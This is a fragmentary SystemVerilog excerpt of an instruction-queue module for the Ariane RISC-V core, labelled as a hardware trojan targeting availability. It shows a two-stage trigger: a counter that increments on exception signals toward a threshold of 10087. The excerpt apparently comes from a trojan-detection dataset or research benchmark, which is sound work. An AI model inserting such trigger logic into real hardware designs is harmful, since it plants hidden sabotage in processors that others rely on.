...
module instr_queue_trojan_Availability
  import ariane_pkg::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=10087)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 10087;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (|exception_tinst_i) trojan_counter <= trojan_counter + 1;
